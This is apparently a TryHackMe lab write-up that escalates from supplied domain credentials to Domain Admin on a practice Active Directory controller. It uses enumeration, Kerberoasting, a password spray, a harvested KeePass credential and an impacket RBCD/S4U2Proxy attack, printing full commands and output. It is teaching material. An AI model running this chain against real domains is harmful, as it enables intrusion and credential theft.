## Forward - THM
Oct 3, 2026 · @Gh0ulH4x

This walkthrough compromises the `ctf.local` Active Directory domain from an assumed-breach foothold, escalating to Domain Admin via a Resource-Based Constrained Delegation (RBCD) attack.
## Scenario

Access to the domain is assumed from the start: valid low-privilege credentials are provided up front, and the objective is lateral movement and privilege escalation to Domain Admin.

|Item|Value|
|---|---|
|Target IP|`10.48.131.13`|
|Domain|`ctf.local`|
|Domain Controller|`DC01.ctf.local`|
|Initial user|`j.smith`|
|Initial password|`JSmith@IT2024`|
## Enumeration
- An Nmap scan shows a single Windows Server 2019 domain controller (`DC01`) exposing the standard AD service set, plus RDP:
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-10-03 01:33:06Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-03T01:34:02+00:00
|_ssl-date: 2026-10-03T01:34:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.ctf.local
| Issuer: commonName=DC01.ctf.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-19T02:27:27
| Not valid after:  2026-11-18T02:27:27
| MD5:     a5ba 7599 e686 083e 1b02 8393 ea32 dc81
| SHA-1:   059b 417e faca 4e2e 5ba0 a4c3 b2c2 52e0 dc7e 2074
| SHA-256: ae97 0c14 065e ff1a 29a0 9543 a9a5 ae2e 8b7f ca54 a854 277e 1c7e c535 dd1a 18af
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49785/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
---
## SMB Shares
- Already have Creds 
```bash
 smbmap -H '10.48.131.13' -u 'j.smith' -p 'JSmith@IT2024' -r SYSVOL/ctf.local

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)           
[+] IP: 10.48.131.13:445        Name: ctf.local                 Status: Authenticated
        Disk                         Permissions     Comment
        ----                         -----------     -------
        ADMIN$                       NO ACCESS       Remote Admin
        C$                           NO ACCESS       Default share
        Downloads                    READ ONLY       File drop share
        IPC$                         READ ONLY       Remote IPC
        NETLOGON                     READ ONLY       Logon server share 
        SYSVOL                       READ ONLY       Logon server share 
        ./SYSVOLctf.local
        dr--r--r--                0 Tue May 19 22:23:41 2026    .
        dr--r--r--                0 Tue May 19 22:23:41 2026    ..
        dr--r--r--                0 Fri Oct  2 21:08:21 2026    DfsrPrivate
        dr--r--r--                0 Tue May 19 22:22:18 2026    Policies
        dr--r--r--                0 Tue May 19 22:22:18 2026    scripts
[*] Closed 1 connections                                                      
```
### Credential Harvesting
- A BloodHound collection against LDAP maps the domain's attack paths:
```bash
nxc ldap '10.48.131.13' -u 'j.smith' -p 'JSmith@IT2024' --bloodhound --collection All --dns-server $DC
```
- Kerberoasting turns up a ticket for a service account, `svc.helpdesk`
```bash
$ nxc ldap '10.48.131.13' -u 'j.smith' -p 'JSmith@IT2024' --kerberoasting 'hashes.txt'
LDAP        10.48.131.13    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.48.131.13    389    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
LDAP        10.48.131.13    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.48.131.13    389    DC01             [*] Total of records returned 1
LDAP        10.48.131.13    389    DC01             [*] sAMAccountName: svc.helpdesk, memberOf: [], pwdLastSet: 2026-05-20 14:35:56.137405, lastLogon: 2026-05-20 14:35:14.951529
LDAP        10.48.131.13    389    DC01             $krb5tgs$23$*svc.helpdesk$CTF.LOCAL$ctf.local\svc.helpdesk*$754af788159e737806bfea59722f9d1a$f3e8beeabce4a864f92c64bbf9a4961792ccbb1d829bd452faacda4b5e205bbe7975fe76fc8f0e5f8776d988d0441f56874a45cb5cee17f6dba74c5698746ce8195d60df8c41f38afe9399ebafaaab999f52ab0bc75f0a6d97c4d8a1377d4bd91c09f2ab2c71e64fd94c07960d8ab97af0536d9266cdeebb5f8b9ade3ce74874ba40f8790ac31c91b7f589c2e3a1b7a775663dccaf8916f4891fbc018955d4d7bb5638b02d70a3bf6158d5fd8d71c00fe25c8cbd6acdb29383fa7eb789ee8a58859e4566aaead4d0268410deeec3b169f9feef891023483de16acbc6b6a4fe1dbc33b4d5c14231db9f88758123cc03d4e7c2db78ff62f45174e946ad8c8d7a6f30c8f4e5e4cc705ca1a93abc477f57dba6f6398e757297227c3ceaac546f7ddcaf2d0d0c9639e39510e3e913ba1da169cf59018015e48e80899eba919ffdaa61825a8b9ef5a641157054249980626a24e87eb3b7754d641f615ec86a4412bf3578acf774d66d092ad45ff33b2f57d19d215e6cb6eefd2d47aff1732b570a3dcbcf24d11a3e17cdbf00138d604a9c220f15e98c8061188cdc3b3f4632415fdd2d13c2cb8c0709c08b189a9358fb17c5133c4c44d45db94a2c3ee132b95cae5c4e4fa5ec30d96dd633bb6a2f6c1c503538639b7d3a2e24c563db03e180f05c0a42b71f7b47806da42a1dee0e8e376c8834aa3c9daedbe5d2fde24607ae58429603bc1398a1b0e1b338edef488186e216848b142fdac5e6227cf70dbb45cc8ee85c238e97f322ee7fad07815b9ee583e6744b67e751568e7cb4b0965e3629791ed26ef71764959a344dfa5acff4f666401e70fbeecae55cb005e9bb4d8b54262eda7074df941702a862f85391e5ff0f9d9a7524de489d3c2e71b0ea3272626666d6e2ad55756f1d715eab9a92d9297cbdbd02ac3b2a3a1164f95d977e5a14768c8e4d6486de971ef48892912287327bfdf86a770c8b8f2b2296d749fec7ac050aba18e91ea1b34f836b6e4b65f0c0b1cc16339f9ce7f215dc43f62fdaa619e066f33dc9d2f82382aad3150499bee77e8db6d1ce5e12e7d7f847e3d2e8684b8743892e60452abf76dfb0ff0b02965491bb0e49411ef9f13beb4af730f120f305ea6fc9e02d2631f875ecdf371d3ea20ea344619169655add721d7a2546d1795c3715c86cd2b89c251976c944582aada2df411dc74977300496fa07f40617dbeaab470aca6222f1e6725d40528af848b169d3ffaec0ee1c653b164bac43cf2cb7749a12834abf7abad4602ca7301803cc7002cf9ca89610b632cd51a6a3a3844125c38c72efa1593d83804d9d05e0932c   
```
- Hash Type
```bash
$ haiti "$(cat hashes.txt)"
Kerberos 5 TGS-REP etype 23 [HC: 13100] [JtR: krb5tgs]
```
- `haiti` identifies the hash as a `crackable` Kerberos 5 TGS-REP (etype 23), but it is **not** cracked by `hashcat` before the wordlist is exhausted — this path is a dead end.
- Host is `RDP` - `Pwn3d!`
```bash
$ nxc rdp '10.48.131.13' -u 'j.smith' -p 'JSmith@IT2024'        
RDP         10.48.131.13    3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         10.48.131.13    3389   DC01             [+] ctf.local\j.smith:JSmith@IT2024 (Pwn3d!)
```
RDP into `DC01` exposes a `Database.kdbx` KeePass file inside the user's Documents folder. Opening it locally with KeePass2 recovers a second set of domain credentials:

| User      | Password      |
| --------- | ------------- |
| `t.jones` | `Helpdesk01!` |
## Lateral Movement

The `t.jones` credentials authenticate over SMB and are used to pull a full user list, which is then sprayed back against the domain to confirm validity:
```bash
$ nxc smb DC01.ctf.local -u 't.jones' -p 'Helpdesk01!'
SMB         10.49.146.194   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.146.194   445    DC01             [+] ctf.local\t.jones:Helpdesk01! 
```
- Enumerate more
```bash
$ nxc smb DC01.ctf.local -u 't.jones' -p 'Helpdesk01!' --users > users.txt
```
- Password Spray Attack
```bash
nxc smb ctf.local -u users.txt -p 'Helpdesk01!' --continue-on-success
```

|Username|Description|
|---|---|
|Administrator|Built-in account for administering the computer/domain|
|Guest|Built-in account for guest access|
|krbtgt|Key Distribution Center Service Account|
|j.smith|IT Staff|
|t.jones|Help Desk|
|r.williams|Help Desk Senior|
|svc.helpdesk|HelpDesk Service Acct|

- Re-checking BloodHound with the fuller picture we now have an active path: `r.williams` has `AddAllowedToAct` over `DC01$`.
---
### Privilege Escalation: RBCD → S4U2Proxy
- `r.william`  able to perform `RBCD` attack
- First create a machine account
```bash
$ impacket-addcomputer 'ctf.local/r.williams:Helpdesk01!' -computer-name 'ATTACKER$' -computer-pass 'Passw0rd123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKER$ with password Passw0rd123!.
```
- once the computer account exists, set up RBCD properly
```bash
$ impacket-rbcd -delegate-to 'DC01$' -delegate-from 'ATTACKER$' -action write 'ctf.local/r.williams:Helpdesk01!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKER$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKER$    (S-1-5-21-1966530601-3185510712-10604624-3109)
```
- request a service ticket impersonating a privileged user
```bash
$ impacket-getST -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKER$:Passw0rd123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```
- use the ticket:
```bash
$ export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
impacket-psexec -k -no-pass -dc-ip 10.48.131.13 ctf.local/Administrator@DC01.ctf.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.ctf.local.....
[*] Found writable share ADMIN$
[*] Uploading file qnlBmwUL.exe
[*] Opening SVCManager on DC01.ctf.local.....
[*] Creating service FaNP on DC01.ctf.local.....
[*] Starting service FaNP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd Desktop     
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/20/2026  03:21 PM    <DIR>          .
05/20/2026  03:21 PM    <DIR>          ..
05/20/2026  05:52 PM                37 flag.txt
               1 File(s)             37 bytes
               2 Dir(s)  14,683,353,088 bytes free

C:\Users\Administrator\Desktop> man flag       
'man' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop> more flag.txt
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
```

## Flag

```
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
```

### Attack Path Summary

1. Authenticated SMB/LDAP enumeration with provided `j.smith` creds surfaces a Downloads share and a BloodHound-mapped domain.
2. Kerberoasting `svc.helpdesk` fails to crack, but RDP access with `j.smith` exposes a KeePass vault yielding `t.jones` creds.
3. User enumeration with `t.jones` confirms valid accounts and reveals `r.williams` holds RBCD write rights over `DC01$`.
4. An attacker-controlled machine account (`ATTACKER$`) is granted delegation rights, then used to forge a service ticket impersonating Administrator via S4U2Self/S4U2Proxy.
5. The forged ticket grants an Administrator shell on the domain controller via `psexec`, completing the compromise.

# END